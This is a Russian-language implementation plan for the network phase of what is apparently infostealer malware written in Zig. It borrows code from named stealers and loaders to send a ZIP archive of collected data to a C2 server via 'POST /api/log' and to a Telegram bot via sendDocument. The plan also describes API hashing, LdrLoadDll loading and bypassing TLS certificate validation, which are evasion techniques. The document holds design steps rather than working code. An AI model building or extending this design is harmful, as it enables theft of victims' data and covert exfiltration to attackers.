# Phase 5: Network — План реализации

## Источники кода

| Модуль | Источники | Ключевые техники |
|--------|-----------|-----------------|
| **SChannel** | PhantomLoader schannel.cpp (1295 lines) | SSPI: AcquireCredentialsHandle → InitializeSecurityContext → EncryptMessage |
| **HTTP/1.1** | PhantomLoader HttpGet/HttpPost, TheBear SendData.c | Manual request builder, multipart/form-data |
| **Telegram** | Phantom Telegram.cs, ferrox telegram.rs, SentinelStealer Telegram.cs | Multipart upload to api.telegram.org |
| **ZIP** | Phemedrone ZipStorage.cs (349 lines) | Custom PKZIP with CRC32, Store method |

## Структура файлов

```
src/network/
├── network.zig      # Оркестратор (подключает TLS + HTTP + ZIP)
├── ws2.zig          # Winsock wrappers (socket, connect, send, recv)
├── schannel.zig     # TLS via secur32.dll SSPI
├── tls_socket.zig   # TLS socket read/write поверх schannel
├── http.zig         # HTTP/1.1 request builder + multipart/form-data
├── panel_http.zig   # POST /api/log с архивом + metadata
├── telegram.zig     # sendDocument к api.telegram.org
└── zip.zig          # PKZIP with Store method
```

## 5.1 ZIP Creation (`zip.zig`) — Приоритет #1

Без ZIP мы не можем сформировать архив для отправки.

**Алгоритм (из Phemedrone ZipStorage.cs):**
```
PKZIP Local File Header:
  Signature: 0x04034b50 (PK\x03\x04)
  Version: 20
  Flags: 0 (no encryption)
  Method: 0 (stored) или 8 (deflated)
  Last mod (DOS): time + date
  CRC32
  Compressed size
  Uncompressed size
  Filename length
  Extra field length
  Filename (variable)
  Extra field
  File data (uncompressed)

Central Directory Header:
  Signature: 0x02014b50 (PK\x01\x02)
  ...same fields + version made by
  Filename

End of Central Directory:
  Signature: 0x06054b50 (PK\x05\x06)
  Disk number, entries, size, offset, comment
```

CRC32 с lookup table (256 entries). Store method = copy bytes directly.

## 5.2 Winsock (`ws2.zig`) — Приоритет #2

Загрузка ws2_32.dll через LdrLoadDll, разрешение функций по хэшу:
- WSAStartup, WSASocketW, WSAConnect, send, recv, closesocket, WSACleanup

## 5.3 SChannel TLS (`schannel.zig`) — Приоритет #3

Из PhantomLoader schannel.cpp:
1. AcquireCredentialsHandleA(UNISP_NAME, SECPKG_CRED_OUTBOUND)
2. InitializeSecurityContextA loop → TLS handshake
3. EncryptMessage/DecryptMessage для данных
4. Certificate validation bypass (SCH_CRED_MANUAL_CRED_VALIDATION)

## 5.4 HTTP (`http.zig`) — Приоритет #4

Manual HTTP/1.1 request builder:
- GET/POST methods
- Headers: Host, Content-Type, Content-Length, Authorization
- Multipart/form-data boundary generation
- Response: status code + headers + body

## 5.5 Telegram (`telegram.zig`) — Приоритет #5

POST к api.telegram.org/bot{token}/sendDocument:
- Multipart: chat_id + document(file) + caption
- Caption max 1000 chars (Telegram API limit)

## 5.6 Panel (`panel_http.zig`) — Приоритет #6

POST /api/log к C2 серверу:
- Authorization: Bearer {token}
- Multipart: archive + metadata JSON
